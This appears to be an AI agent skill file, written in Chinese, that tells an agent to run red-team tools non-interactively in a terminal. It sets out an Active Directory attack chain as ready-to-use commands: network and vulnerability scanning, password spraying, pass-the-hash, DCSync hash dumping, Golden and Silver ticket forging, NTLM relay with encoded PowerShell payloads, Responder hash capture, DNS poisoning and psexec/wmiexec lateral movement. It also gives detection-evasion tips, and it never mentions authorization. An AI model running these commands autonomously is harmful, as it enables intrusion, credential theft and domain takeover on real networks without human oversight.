---
name: redteam
description: RedTeam physical terminal execution skill. ONLY run using run_in_terminal. Use for network scan, lateral movement, etc.
---

#  AI 执行的底层通用指导原则

1. **防阻塞与交互死锁**:
   - 这些黑客工具必须以**完全非交互方式**运行，不触发密码输入或确认提示。
   - 监听类阻塞型工具（如 ntlmrelayx.py）须用 isBackground=true 后台执行并设置周期超时。

2. **防上下文过载 (Context Overflow)**:
   - 扫描输出大时，**将结果重定向到文件**（如 > result.txt），再用 Select-String / findstr / Get-Content 按关键字提取。
   - 善用各工具的静默参数（gogo: -q；fscan: -silent；httpx: -silent；nuclei: -nc；ffuf: -s）。

3. **渐进式探测法（黄金工作流）**:
   gogo (存活/端口/协议识别)  httpx (Web 指纹/标题/状态码)  nuclei (精确漏洞验证) / ffuf (路径爆破)

---

##  工具一：gogo (极速资产与协议指纹探针)

**二进制路径**: d:\mcp\tools\gogo.exe

**核心参数**（来自 gogo -h）：

- -i <IP/CIDR> : 目标 IP 或网段，支持逗号分隔多目标
- -p <ports>   : 端口，支持数字/范围/预设别名（top1/top2/win/db/smb/oxid 等）
- -m <mode>    : 扫描模式 default / s (smart) / ss (supersmart) / sc
- --ping        : ICMP 存活预探测
- -v            : 启用主动指纹扫描
- -e            : 启用漏洞利用模板扫描
- -q            : 安静模式（防输出过载必加）
- -f <file>     : 结果输出到文件
- --af           : 自动命名输出文件
- -t <n>        : 并发线程数
- -d <n>        : 超时秒数（默认 2）
- -l <file>     : 从文件读取目标列表

**实战指令**:

  # 单目标常见端口快扫
  gogo -i 10.10.26.107 -p top2,win,db -v

---

##  工具二：fscan (内网综合大杀器)

**二进制路径**: d:\mcp\tools\fscan.exe

**核心参数**（来自 fscan -h）：

- -h <target>   : 目标 IP/网段（必填，如 192.168.1.1/24）
- -p <ports>    : 端口（默认含常见 21/22/80/445/3306/6379 等）
- -pa <port>    : 追加端口到默认列表
- -np           : 不 ping（禁 ICMP 时必加）
- -nobr         : 不爆破弱口令（加速）
- -nopoc        : 不跑 Web PoC
- -silent       : 安静模式
- -nocolor      : 关闭颜色（重定向文件时必加）
- -o <file>     : 输出文件（默认 result.txt）
- -t <n>        : 线程数（默认 600）
- -time <n>     : 超时秒数（默认 3）
- -m <type>     : 只扫特定服务（ssh/smb/etc）
- -pocname <name> : 只跑含关键字的 PoC（如 weblogic）
- -json         : JSON 格式输出

**实战指令**:

  # 快速内网打点
  fscan -h 10.10.26.0/24 -np -nobr -silent -nocolor -o fscan_result.txt

  # 提取漏洞命中行
  Select-String -Path fscan_result.txt -Pattern "\[\+\]|Vulnerable|MS17|Weblogic|Shiro"

  # 只跑特定 PoC
  fscan -h 10.10.26.107 -np -nobr -pocname weblogic

---

##  工具三：httpx (高并发 HTTP 探针与指纹识别)

**二进制路径**: d:\mcp\tools\httpx.exe

**核心参数**（来自 httpx -h）：

- -u / -target <url>  : 单个目标 URL
- -l / -list <file>   : 从文件读取目标
- -sc / -status-code  : 显示状态码
- -title              : 显示页面标题
- -server             : 显示 Server 头（等同 -web-server）
- -td / -tech-detect  : 显示技术栈指纹（Wappalyzer）
- -cl / -content-length : 显示响应长度
- -ip                 : 显示解析 IP
- -silent             : 只输出结果行
- -nc / -no-color     : 关闭颜色
- -fc <codes>         : 过滤状态码（如 -fc 404）
- -mc <codes>         : 只保留指定状态码
- -timeout <n>        : 超时秒数
- -o <file>           : 输出文件

**实战指令**:

  # 单目标详细指纹（正确参数）
  httpx -u http://10.10.26.107:8080 -sc -title -server -td -ip -silent

  # 批量探测，过滤 404
  httpx -l urls.txt -sc -title -server -td -silent -fc 404 -o httpx_result.txt

 注意：-server（不是 -web-server）；-td（不是 -tech-detect 短形）；-sc（不是 -status-code）。两种都支持但短参更稳。

---

##  工具四：nuclei (基于 YAML 模板的精确漏洞扫描器)

**二进制路径**: d:\mcp\tools\nuclei.exe

**核心参数**（来自 nuclei -h）：

- -u / -target <url>  : 单个目标
- -l / -list <file>   : 目标列表文件
- -t / -templates <path> : 模板路径/目录（如 cves/ technologies/ exposed-panels/）
- -tags <tags>        : 按标签筛选（逗号分隔，如 cve,rce,sqli）
- -s / -severity <v>  : 按严重性筛选（info/low/medium/high/critical）
- -as                 : 自动识别技术栈并匹配标签
- -nc / -no-color     : 关闭颜色（比 -silent 更安全，不会屏蔽结果）
- -o / -output <file> : 输出文件
- -j / -jsonl         : JSONL 格式输出
- -etags <tags>       : 排除标签
- -id <id>            : 按模板 ID 运行
- -nt                 : 只运行最新模板

**实战指令**:

  # 自动识别技术栈爆高危洞
  nuclei -u http://10.10.26.107:8080 -as -s high,critical -nc

  # 指定模板目录
  nuclei -u http://10.10.26.107:8080 -t technologies/ -nc

  # 按 CVE 标签
  nuclei -u http://10.10.26.107:8080 -tags cve,rce -s high,critical -nc -o nuclei_result.txt

  # 批量目标
  nuclei -l urls.txt -tags shiro,weblogic,log4j -s critical -nc -o nuclei_result.txt

 注意：
- -t 是模板路径；-s 是严重性；-tags 是标签。
- -it 是 -include-templates（路径），不是 "-it tags cve" 这种用法，标签必须用 -tags。
- -silent 会屏蔽所有输出包括漏洞结果，用 -nc 代替。

---

##  工具五：ffuf (超音速 HTTP Fuzzer)

**二进制路径**: d:\mcp\tools\ffuf.exe

**核心参数**（来自 ffuf -h）：

- -u <url>      : 目标 URL，含 FUZZ 占位符（必填）
- -w <wordlist> : 字典文件路径（必填）
- -mc <codes>   : 匹配状态码（如 -mc 200,301,302）
- -fc <codes>   : 过滤状态码
- -fs <size>    : 按响应长度过滤干扰页
- -t <n>        : 并发数（默认 40）
- -s            : 安静模式
- -o <file>     : 输出文件
- -H <header>   : 自定义请求头
- -e <exts>     : 追加扩展名（如 -e .php,.bak,.zip）
- -r            : 跟随重定向
- -timeout <n>  : 超时秒数

**实战指令**:

  # 基础目录爆破
  ffuf -u http://10.10.26.107:8080/FUZZ -w d:\mcp\tools\dict.txt -mc 200,301,302 -s

  # 带扩展名查备份文件
  ffuf -u http://10.10.26.107:8080/FUZZ -w d:\mcp\tools\dict.txt -e .php,.bak,.zip,.sql -mc 200 -s

  # 过滤固定长度干扰
  ffuf -u http://target.com/FUZZ -w dict.txt -mc 200,301 -fs 1234 -s

  # VHost 枚举
  ffuf -u http://10.10.26.107/ -H "Host: FUZZ.corp.local" -w subdomains.txt -mc 200 -s

---

##  工具六：dnsx (DNS 解析与子域名枚举)

**二进制路径**: d:\mcp\tools\dnsx.exe

**实战指令**:

  # 子域名枚举
  dnsx -d corp.local -w subdomains.txt -resp -silent

  # 批量反查 IP
  dnsx -l domains.txt -resp -a -silent -o resolved.txt

---

##  工具七：kerbrute (Kerberos 用户枚举与密码喷洒)

**二进制路径**: d:\mcp\tools\kerbrute.exe

**子命令**：

| 子命令 | 用途 |
|--------|------|
| `userenum` | 枚举域内有效用户名（无需凭据，利用 Kerberos AS-REQ） |
| `passwordspray` | 单密码喷洒用户列表（避免锁定) |
| `bruteuser` | 对单个用户暴力破解密码 |
| `bruteforce` | 用户名:密码组合字典爆破 |

**核心参数**：

- `-d / --domain <domain>` : 目标域名（必填）
- `--dc <ip>`              : 域控 IP（不填则 DNS 自动解析）
- `-t <n>`                 : 并发线程数（默认 10）
- `-o <file>`              : 输出有效结果到文件
- `-v`                     : 详细输出（显示失败）
- `--downgrade`            : 强制降级到 RC4（绕过部分检测）
- `--safe`                 : 安全模式，跳过已锁定账户

**实战指令**:

  # 用户名枚举（不需要密码，最低权限侦查）
  kerbrute userenum -d corp.local --dc 192.168.1.10 users.txt -o valid_users.txt

  # 密码喷洒（单密码 × 用户列表，推荐加 --safe 防锁定）
  kerbrute passwordspray -d corp.local --dc 192.168.1.10 valid_users.txt 'Password123!' --safe -o spray_result.txt

  # 暴力破解单用户
  kerbrute bruteuser -d corp.local --dc 192.168.1.10 administrator passwords.txt

  # 用户名:密码组合爆破
  kerbrute bruteforce -d corp.local --dc 192.168.1.10 combos.txt -t 20

 注意：
- kerbrute 直接与域控 88 端口通信，**无需加入域**即可枚举用户。
- passwordspray 每账户只尝试一次，适合生产域；bruteuser 会触发锁定策略。
- 输出文件中以 `VALID USERNAME` 标注有效用户，可直接作为后续 impacket / nxc 的用户列表。

---

##  Python 系域渗透工具包 (nxc / Impacket)

> **Impacket / nxc / bloodhound-python 已由 scripts/install_tools.py 统一安装。**
> Agent 直接按以下规则调用，无需验证安装状态。
>
> **Windows 用户注意事项**：
> - 如果 `impacket-*` 命令无法识别，请将 impacket 安装目录添加到系统 PATH
> - 或者使用 `python -m impacket.examples.<工具名>` 方式调用
> - impacket 默认安装在 Python 目录的 `Scripts` 文件夹中
>
> **Impacket Windows 调用规则**（优先级）：
> 1. `impacket-<工具名>` 入口点（推荐）： `impacket-wmiexec`
> 2. fallback：`python -m impacket.examples.<工具名>`
>
> | 脚本名 (.py) | Windows 调用命令 |
> |---|---|
> | wmiexec.py | `impacket-wmiexec` |
> | psexec.py | `impacket-psexec` |
> | secretsdump.py | `impacket-secretsdump` |
> | GetNPUsers.py | `impacket-GetNPUsers` |
> | GetUserSPNs.py | `impacket-GetUserSPNs` |
> | getST.py | `impacket-getST` |
> | ntlmrelayx.py | `impacket-ntlmrelayx` |
>
> 所有 impacket 工具均为**非交互式**，密码/哈希必须内联传参。

---

### NetExec (nxc)  内网横向渗透控制台

支持协议: smb / ssh / winrm / wmi / mssql / rdp / vnc / ftp / ldap / nfs

  # SMB 验证 + 枚举共享
  nxc smb 10.10.26.107 -u Administrator -p 'Admin@123' --shares

  # PtH（-H 传 NT Hash）
  nxc smb 192.168.1.10 -u Administrator -H aad3b435b51404eeaad3b435b51404ee:NTHASH

  # WinRM 执行命令
  nxc winrm 10.10.26.107 -u Administrator -p 'Admin@123' -x 'whoami /all'

  # 枚举域用户
  nxc smb 10.10.26.107 -u user -p pass --users

  # 本地账户喷洒整个网段
  nxc smb 192.168.1.0/24 -u Administrator -p 'Admin@123' --local-auth

---

### Impacket  wmiexec / psexec（远程命令执行）

  # wmiexec 无文件执行（最隐蔽）— Windows 入口点
  impacket-wmiexec domain/Administrator:password@10.10.26.107 'whoami'

  # PtH 执行（冒号前 LM Hash 可留空）
  impacket-wmiexec -hashes :NTHASH domain/Administrator@10.10.26.107 'ipconfig /all'

  # psexec（落地服务，可得 SYSTEM）
  impacket-psexec domain/Administrator:password@10.10.26.107 cmd.exe

  # fallback：python -m 方式
  python -m impacket.examples.wmiexec domain/Administrator:password@10.10.26.107 'whoami'

---

### Impacket  secretsdump（凭据提取 / DCSync）

  # DCSync 导出全域 Hash（需要域管权限）— Windows 入口点
  impacket-secretsdump corp.local/Administrator:password@192.168.1.dc -just-dc

  # PtH 模式
  impacket-secretsdump -hashes :NTHASH corp.local/Administrator@192.168.1.dc -just-dc

  # 只导出单个用户（如 krbtgt 做黄金票据）
  impacket-secretsdump corp.local/Administrator:password@192.168.1.dc -just-dc-user krbtgt

  # 提取本机 SAM/LSA（本地 admin 即可）
  impacket-secretsdump Administrator:password@10.10.26.107

  # fallback：python -m 方式
  python -m impacket.examples.secretsdump corp.local/Administrator:password@192.168.1.dc -just-dc

---

### bloodhound-python (AD 权限图谱收集 - Linux/macOS)

**二进制路径**: Python 模块（`pip install bloodhound`）

> 适用于从 Linux/Mac 机器或没有 Windows 域环境的机器上收集 AD 数据。

  # 收集所有 AD 数据
  bloodhound-python -d corp.local -u lowpriv_user -p password -dc 192.168.1.10 -c All --zip

  # 只收集会话和 ACL（轻量级）
  bloodhound-python -d corp.local -u user -p pass -dc 192.168.1.10 -c Session,ACL

  # 只收集组和信任关系
  bloodhound-python -d corp.local -u user -p pass -dc 192.168.1.10 -c Group,Trusts

  # 使用哈希认证
  bloodhound-python -d corp.local -u user -hashes :NTHASH -dc 192.168.1.10 -c All --zip

---

##  工具八：SharpHound (AD 权限图谱收集 - Windows)

**二进制路径**: d:\mcp\tools\SharpHound.exe

> SharpHound 是 BloodHound 的官方 Windows 收集器，性能更优，支持更多 Windows 特有数据收集。
> 适用于已获得 Windows 主机权限的场景，可直接在域内机器上运行。

**核心参数**：

| 参数 | 说明 |
|------|------|
| `-c <CollectionMethod>` | 收集方法：Default / All / Session / SessionLoop / LoggedOn / ACL / ObjectProps / GPOAnalytic / RDP / DCOM / LocalAdmin / PSRemote / Carstein / Trusts / Default / DCOnly |
| `-d <Domain>` | 指定目标域（如 corp.local） |
| `-dc <DomainController>` | 指定域控（可多个，逗号分隔） |
| `-u / -username <user>` | 认证用户名 |
| `-p / -password <pass>` | 认证密码 |
| `-Hashes <LMHASH:NTHASH>` | NTLM 哈希认证 |
| `-k / -kerberos` | 使用 Kerberos 认证（支持票据） |
| `-o <outputfolder>` | 输出目录（默认当前目录） |
| `--zipfilename <name>` | 指定 ZIP 输出文件名 |
| `-t <timeout>` | 每个请求超时秒数（默认 60） |
| `--throttle` | 启用节流模式（减少网络流量） |
| `--randomizefilenames` | 随机化输出文件名 |
| `--skipRegistryCheck` | 跳过注册表检查 |
| `--collectAllProperties` | 收集所有对象属性（更慢但更全） |
| `--dns Servers=<ip1,ip2>` | 指定 DNS 服务器 |
| `--ldapfilter <filter>` | 自定义 LDAP 过滤条件 |
| `-v` | 详细输出 |

**收集方法详解**：

| 收集方法 | 收集内容 | 适用场景 |
|----------|----------|----------|
| `Default` | 组、成员、本地组成员、会话、ACL、对象属性、信任、GPO | 标准推荐 |
| `All` | 所有收集类型 | 最全面渗透测试 |
| `Session` | 用户-计算机会话关系 | 找活跃用户路径 |
| `SessionLoop` | 循环收集会话（配合长期监听） | 捕获登录会话 |
| `LoggedOn` | 已登录用户（需管理员权限） | 找高价值目标 |
| `ACL` | ACL/ACE 权限分析 | 找权限滥用路径 |
| `ObjectProps` | 对象属性扩展 | 找密码属性 |
| `GPOAnalytic` | GPO 有效权限分析 | 找 GPO 攻击路径 |
| `RDP` | RDP 会话关系 | 找远程桌面路径 |
| `DCOM` | DCOM 对象信息 | 找 COM 滥用路径 |
| `LocalAdmin` | 本地管理员 | 找本机权限 |
| `PSRemote` | PSRemote/WinRM 会话 | 找远程管理路径 |
| `Trusts` | 域信任关系 | 跨域攻击分析 |
| `DCOnly` | 只连接 DC（不扫描客户端） | DC 数据快速收集 |

**实战指令**：

  # 标准收集（推荐）- 生成一个 ZIP 文件
  SharpHound.exe -c Default -d corp.local

  # 完整收集（最全面）
  SharpHound.exe -c All -d corp.local

  # 收集会话信息（找用户-计算机映射）
  SharpHound.exe -c Session -d corp.local

  # 使用凭据收集（域内任意机器运行）
  SharpHound.exe -c Default -d corp.local -u lowpriv_user -p password

  # 使用哈希收集（Pass-the-Hash）
  SharpHound.exe -c Default -d corp.local -u Administrator -Hashes :NTHASH

  # 使用 Kerberos 票据收集
  SharpHound.exe -c Default -d corp.local -k

  # 指定域控和输出目录
  SharpHound.exe -c Default -d corp.local -dc 192.168.1.10 -o "C:\Windows\Temp\BHDATA"

  # 指定自定义输出文件名
  SharpHound.exe -c All -d corp.local --zipfilename bloodhound_data

  # 指定多个域控
  SharpHound.exe -c Default -d corp.local -dc DC01.corp.local,DC02.corp.local

  # 使用 DNS 服务器
  SharpHound.exe -c Default -d corp.local --dns 8.8.8.8

**注意事项**：
- SharpHound 生成的 ZIP 文件需要导入到 **BloodHound GUI** (Linux/Windows) 进行分析
- 默认输出 `*.json` 文件和压缩的 `.zip` 文件
- 在被发现的概率较高，建议配合长期监听 `SessionLoop` 模式
- `-c All` 会触发大量 LDAP 查询，可能被安全设备检测

**与 bloodhound-python 对比**：

| 特性 | SharpHound (Windows) | bloodhound-python (跨平台) |
|------|---------------------|---------------------------|
| 平台 | Windows | Linux/macOS/Windows |
| 性能 | 更优 | 一般 |
| LocalAdmin 收集 | 支持 | 不支持 |
| LoggedOn 收集 | 支持 | 不支持 |
| GPOAnalytic | 支持 | 不支持 |
| 运行位置 | 需 Windows 机器 | 任意平台 |

---

## 工具九：pywerview (域信息枚举)

**Python 包**: `pip install pywerview`

> PowerView.py 的 Python 实现，无需 PowerShell，直接在任意平台枚举域信息。
> 是域渗透中最重要的侦查工具之一。

**子命令**：

| 子命令 | 说明 |
|--------|------|
| `get-domain-user` | 枚举域用户 |
| `get-domain-computer` | 枚举域计算机 |
| `get-domain-group` | 枚举域组 |
| `get-domain-group-member` | 获取组成员 |
| `get-domain-share` | 枚举共享 |
| `get-domain-gpo` | 枚举 GPO |
| `get-domain-trust` | 获取域信任 |
| `get-net-localgroup` | 获取本地组 |
| `get-net-session` | 获取会话 |
| `get-net-loggedon` | 获取登录用户 |
| `find-local-admin` | 寻找本地管理员 |

**实战指令**：

  # 枚举域用户
  pywerview.py get-domain-user -d corp.local --dc-ip 192.168.1.10 -u user -p pass

  # 枚举域计算机
  pywerview.py get-domain-computer -d corp.local --dc-ip 192.168.1.10 -u user -p pass

  # 枚举域组及成员
  pywerview.py get-domain-group -d corp.local --dc-ip 192.168.1.10 -u user -p pass

  # 获取 Domain Admins 成员
  pywerview.py get-domain-group-member -d corp.local --dc-ip 192.168.1.10 -u user -p pass --group-name "Domain Admins"

  # 枚举共享
  pywerview.py get-domain-share -d corp.local --dc-ip 192.168.1.10 -u user -p pass

  # 寻找本地管理员
  pywerview.py find-local-admin -d corp.local --dc-ip 192.168.1.10 -u user -p pass

---

## 工具十：ldapdomaindump (LDAP 域信息转储)

**Python 包**: `pip install ldapdomaindump`

> 将域信息转储为 HTML/JSON/CSV 格式，便于分析和报告生成。

**实战指令**：

  # 基本转储
  ldapdomaindump ldap://192.168.1.10 -u 'corp\user' -p 'password' -o ./ldapdump

  # 只输出 JSON
  ldapdomaindump ldap://192.168.1.10 -u 'corp\user' -p 'password' -o ./ldapdump --json

  # 禁用彩色输出
  ldapdomaindump ldap://192.168.1.10 -u 'corp\user' -p 'password' -o ./ldapdump -n

**输出文件**：

| 文件 | 说明 |
|------|------|
| domain_users.html | 域用户列表 |
| domain_computers.html | 域计算机列表 |
| domain_groups.html | 域组列表 |
| domain_trusts.html | 域信任关系 |
| domain_policy.html | 域策略 |

---

## 工具十一：Responder (LLMNR/NBT-NS 欺骗)

**Python 包**: `pip install responder`

> 在内网中监听 LLMNR/NBT-NS/mDNS 广播，欺骗认证，捕获 NetNTLMv1/v2 哈希。
> 可用于哈希重放攻击或离线破解。

**重要提示**：

> ⚠️ Responder 是监听型工具，必须配合 `impacket-responder` 终端工具使用（后台运行 + 超时）。

**参数**：

| 参数 | 说明 |
|------|------|
| `-I <interface>` | 监听网卡（IP 或名称） |
| `-w` | 开启 WPAD 代理服务器 |
| `-F` | 强制 NTLM 认证 |
| `--lm` | 强制 LM 哈希（更易破解） |
| `-v` | 详细输出 |

**实战指令**：

  # 启动 Responder（使用 终端工具自动后台运行）
  impacket-responder is NOT supported, manually run responder with nohup or Start-Job.

  # 查看捕获的哈希
  # Hashes 保存在: /usr/share/responder/logs/

**稳定复现建议（含 downdetector.ps1 场景）**：

- 若目标链路是触发认证并抓取 NetNTLM，优先使用 **Responder 监听**，比 relay 链更直接。
- 监听类任务务必后台运行，并周期性读取输出，避免阻塞会话。
- 先确认网卡与广播域，再启用 `-I` 指定接口，减少空跑。

---

## 工具补充：dnstool.py（ADIDNS 记录管理）

> 用于快速创建/修改 ADIDNS 记录，替代手工 LDAP 写入。
> 适合 DNS 记录投毒、委派链路准备和复现场景自动化。

**入口方式**：

- `dnstool.py`（常见于 krbrelayx / impacket 生态）
- 或 `python -m dnstool`（按实际安装方式）

**常用操作示例**：

```bash
# 添加 A 记录
dnstool.py -u 'corp.local\\user' -p 'Password123!' -r app01.corp.local -d 10.10.10.66 --action add 192.168.1.10

# 修改记录
dnstool.py -u 'corp.local\\user' -p 'Password123!' -r app01.corp.local -d 10.10.10.77 --action modify 192.168.1.10

# 删除记录
dnstool.py -u 'corp.local\\user' -p 'Password123!' -r app01.corp.local --action remove 192.168.1.10
```

**注意事项**：

- 操作前先确认 DNS 分区与 ACL，避免写入失败误判。
- 成功写入后用 `nslookup`/`Resolve-DnsName` 二次验证解析生效。

### Impacket  Kerberoasting / AS-REP Roasting

### Impacket 核心脚本链路（取票据 + 读目标）

> 下列脚本是最终拿票据、横向执行与读取目标内容的核心组合：

- `getST.py`
- `smbclient.py`
- `wmiexec.py`
- `psexec.py`

**最小链路示例**：

```bash
# 1) getST: 申请/伪造服务票据
impacket-getST -spn cifs/target.corp.local -impersonate Administrator -dc-ip 192.168.1.10 corp.local/machine_account:password

# 2) smbclient: 用票据或凭据访问共享并读取文件
impacket-smbclient corp.local/Administrator:password@target.corp.local -share C$ 'get Users\\Public\\flag.txt'

# 3) wmiexec: 无文件执行命令回显
impacket-wmiexec corp.local/Administrator:password@target.corp.local 'type C:\\Users\\Public\\flag.txt'

# 4) psexec: 服务方式执行（需要更高噪声容忍）
impacket-psexec corp.local/Administrator:password@target.corp.local cmd.exe
```

---

## LDAP/DNS 诊断工具组（bloodyAD / ldapsearch / ldapdomaindump）

> 用于快速确认 gMSA、委派配置、DNS 区域 ACL 是否满足攻击前提。

### bloodyAD

**安装**：`pip install bloodyAD`

**示例**：

```bash
# 枚举目标对象属性（含委派相关字段）
bloodyAD --host 192.168.1.10 -d corp.local -u user -p 'Password123!' get object 'CN=APP01,OU=Servers,DC=corp,DC=local'

# 查询用户对象（用于验证 gMSA/委派变更）
bloodyAD --host 192.168.1.10 -d corp.local -u user -p 'Password123!' get object 'CN=gmsa_svc,CN=Managed Service Accounts,DC=corp,DC=local'
```

### ldapsearch / ldapdomaindump

- `ldapsearch`：快速点查关键属性（委派、SPN、ACL 相关字段）。
- `ldapdomaindump`：全量导出做离线核验与报告。

**示例**：

```bash
# impacket-ldapsearch 快速核验委派字段
impacket-ldapsearch corp.local/user:pass -dc-hosts=192.168.1.10 -query "(servicePrincipalName=*)"

# ldapdomaindump 导出域数据进行 ACL/DNS 关联分析
ldapdomaindump ldap://192.168.1.10 -u 'corp\\user' -p 'password' -o ./ldapdump
```

  # AS-REP Roasting — Windows 入口点
  impacket-GetNPUsers corp.local/user:pass -dc-ip 192.168.1.10 -request -format hashcat -outputfile asrep_hashes.txt

  # 无密码匿名尝试
  impacket-GetNPUsers corp.local/ -no-pass -usersfile users.txt -dc-ip 192.168.1.10 -format hashcat

  # Kerberoasting
  impacket-GetUserSPNs corp.local/user:pass -dc-ip 192.168.1.10 -request -outputfile kerb_hashes.txt

  # fallback：python -m 方式
  python -m impacket.examples.GetNPUsers corp.local/user:pass -dc-ip 192.168.1.10 -request -format hashcat

---

### Impacket  getST（S4U 委派伪造票据）

  # RBCD 伪造 Administrator 票据 — Windows 入口点
  impacket-getST -spn cifs/target.corp.local -impersonate Administrator -dc-ip 192.168.1.10 corp.local/machine_account:password

  # PtH 模式
  impacket-getST -spn cifs/target.corp.local -impersonate Administrator -hashes :NTHASH -dc-ip 192.168.1.10 corp.local/machine_account

  # Windows 加载票据（PowerShell）
  $env:KRB5CCNAME = "Administrator.ccache"
  # 或
  [Environment]::SetEnvironmentVariable("KRB5CCNAME", "Administrator.ccache")

  # fallback：python -m 方式
  python -m impacket.examples.getST -spn cifs/target.corp.local -impersonate Administrator -dc-ip 192.168.1.10 corp.local/machine_account:password

---

### Impacket  ntlmrelayx（NTLM 中继攻击）

> ⚠️ 此工具是长期监听型！必须使用 **终端后台运行** 或 run_in_terminal isBackground=true 后台运行并设置超时时间。
> 直接调用方式（Windows 入口点）：

  # 中继到 LDAP — Windows 入口点
  impacket-ntlmrelayx -t ldap://192.168.1.dc --smb2support

  # 中继到 SMB 执行命令
  impacket-ntlmrelayx -t smb://192.168.1.10 --smb2support -c "whoami > C:\result.txt"

  # 多目标中继
  impacket-ntlmrelayx -tf targets.txt --smb2support -c "powershell -enc BASE64_PAYLOAD"

  # fallback：python -m 方式
  python -m impacket.examples.ntlmrelayx -t ldap://192.168.1.dc --smb2support

> 注意：终端后台运行 已封装好后台执行逻辑，优先使用它而非手动 run_in_terminal。

---

## impacket 工具包扩展

### smbclient (SMB 共享访问)

**终端工具**: `impacket-smbclient`

**入口点**: `impacket-smbclient` 或 `smbclient.py`

**功能**: 通过 SMB 协议连接远程共享，执行交互式命令或单条命令

**参数说明**:

| 参数 | 说明 |
|------|------|
| auth_uri | 认证信息，格式 `domain/username:password@target` |
| share | 目标共享名称 (默认 `C$`) |
| cmd | 要执行的 SMB 命令 (如 `ls`/`download file.txt`/`upload payload.exe`) |
| args | 附加参数 (如 `-hashes :NTHASH`) |

**使用示例**:

```bash
# 连接 SMB 共享并列出文件
impacket-smbclient corp.local/Administrator:password@10.10.26.107 -share C$

# 下载文件
impacket-smbclient corp.local/Administrator:password@10.10.26.107 -share C$ 'get secret.txt'

# 使用哈希连接
impacket-smbclient -hashes :NTHASH corp.local/Administrator@10.10.26.107 -share C$
```

---

### ticketer (Kerberos 票据伪造)

**终端工具**: `impacket-ticketer`

**入口点**: `impacket-ticketer` 或 `ticketer.py`

**功能**: 伪造 Golden Ticket / Silver Ticket

**参数说明**:

| 参数 | 说明 |
|------|------|
| domain | 域名 (如 `corp.local`) |
| user | 要伪造的用户名 |
| hash | krbtgt 的 LMHASH:NTHASH |
| sid | 域的 SID |
| aes_key | AES key (可选) |
| extra_sids | 额外 SID (如 Enterprise Admins) |
| lifetime | 票据有效期 (默认 10 小时) |

**使用示例**:

```bash
# 伪造 Administrator Golden Ticket
impacket-ticketer -domain corp.local -domain-sid S-1-5-21-xxx Administrator -hashes :NTHASH -duration 10

# 伪造服务 Silver Ticket
impacket-ticketer -domain corp.local -domain-sid S-1-5-21-xxx -spn cifs/target.corp.local Administrator -hashes :NTHASH

# 添加 Enterprise Admins 权限
impacket-ticketer -domain corp.local -domain-sid S-1-5-21-xxx -extra-sid S-1-5-21-xxx-519 Administrator -hashes :NTHASH
```

---

### psexec (服务执行横向)

**终端工具**: `impacket-psexec_exec`

**入口点**: `impacket-psexec` 或 `psexec.py`

**功能**: 远程创建服务执行程序

**使用示例**:

```bash
# 基本横向
impacket-psexec corp.local/Administrator:password@10.10.26.107 cmd.exe

# 使用哈希
impacket-psexec -hashes :NTHASH corp.local/Administrator@10.10.26.107 'whoami'
```

---

### smbexec (无文件横向)

**终端工具**: `impacket-smbexec`

**入口点**: `impacket-smbexec` 或 `smbexec.py`

**功能**: 通过 SMB 共享执行命令，不创建服务(更隐蔽)

**使用示例**:

```bash
# 执行命令
impacket-smbexec corp.local/Administrator:password@10.10.26.107 -c 'whoami'

# 无输出模式
impacket-smbexec -hashes :NTHASH corp.local/Administrator@10.10.26.107
```

---

### dcomexec (DCOM 横向)

**终端工具**: `impacket-dcomexec`

**入口点**: `impacket-dcomexec` 或 `dcomexec.py`

**功能**: 通过 DCOM 接口执行命令 (绕过 SMB 限制)

**使用示例**:

```bash
# 使用 MMC20 Application DCOM
impacket-dcomexec corp.local/Administrator:password@10.10.26.107 'whoami'

# 指定 ShellWindows
impacket-dcomexec -object ShellWindows corp.local/Administrator:password@10.10.26.107
```

---

### rpcdump (RPC 端点枚举)

**终端工具**: `impacket-rpcdump`

**入口点**: `impacket-rpcdump` 或 `rpcdump.py`

**功能**: 枚举 RPC 端点和服务

**使用示例**:

```bash
# 枚举所有 RPC 端点
impacket-rpcdump target@192.168.1.10

# 过滤特定管道
impacket-rpcdump target@192.168.1.10 -pipes spoolss,eventlog
```

---

### mssqlclient (SQL Server 连接)

**终端工具**: `impacket-mssqlclient`

**入口点**: `impacket-mssqlclient` 或 `mssqlclient.py`

**功能**: 连接 MS SQL Server 执行 SQL 命令或 xp_cmdshell

**使用示例**:

```bash
# 连接并执行 SQL
impacket-mssqlclient corp.local/user:password@10.10.26.107 -db master 'SELECT @@version'

# 启用 xp_cmdshell
impacket-mssqlclient corp.local/user:password@10.10.26.107 'EXEC sp_configure "xp_cmdshell", 1; RECONFIGURE;'
```

---

### goldenPac (Golden Ticket 自动横向)

**终端工具**: `impacket-goldenPac`

**入口点**: `impacket-goldenPac` 或 `goldenPac.py`

**功能**: 使用 Golden Ticket 维持目标机器访问

**使用示例**:

```bash
# Golden Ticket 横向
impacket-goldenPac corp.local/user:pass@target -dc-ip 192.168.1.10

# 指定 krbtgt 哈希
impacket-goldenPac -hashes :NTHASH corp.local/user@target -dc-ip 192.168.1.10
```

---

### netview (域内主机枚举)

**终端工具**: `impacket-netview`

**入口点**: `impacket-netview` 或 `netview.py`

**功能**: 枚举域内主机、共享、会话和登录用户

**使用示例**:

```bash
# 获取所有会话
impacket-netview corp.local/Administrator:password -target-file targets.txt -show-sessions

# 获取登录用户
impacket-netview -hashes :NTHASH corp.local/Administrator@dc -show-loggedin
```

---

### lookupsid (SID 枚举)

**终端工具**: `impacket-lookupsid`

**入口点**: `impacket-lookupsid` 或 `lookupsid.py`

**功能**: 通过 LSARPC 枚举域用户 SID

**使用示例**:

```bash
# 枚举用户 SID
impacket-lookupsid corp.local/Administrator:password@192.168.1.10

# 匿名枚举
impacket-lookupsid target@192.168.1.10 -domain corp.local
```

---

### ldapsearch (LDAP 查询)

**终端工具**: `impacket-ldapsearch`

**入口点**: `impacket-ldapsearch` 或 `ldapsearch.py`

**功能**: 查询 LDAP 目录获取域信息

**使用示例**:

```bash
# 枚举所有用户
impacket-ldapsearch corp.local/user:pass -dc-hosts=192.168.1.10 -query "(objectClass=user)"

# 查找域管
impacket-ldapsearch corp.local/user:pass -dc-hosts=192.168.1.10 -query "(memberOf=*Domain Admins*)"
```

---

### services (Windows 服务管理)

**终端工具**: `impacket-services`

**入口点**: `impacket-services` 或 `services.py`

**功能**: 枚举、启动、停止、创建 Windows 服务

**使用示例**:

```bash
# 查询服务
impacket-services corp.local/Administrator:password@target -action query

# 启动服务
impacket-services -hashes :NTHASH corp.local/Administrator@target -action start -service-name VulnService
```

---

### nfs_mount (NFS 挂载)

**终端工具**: `impacket-nfs_mount`

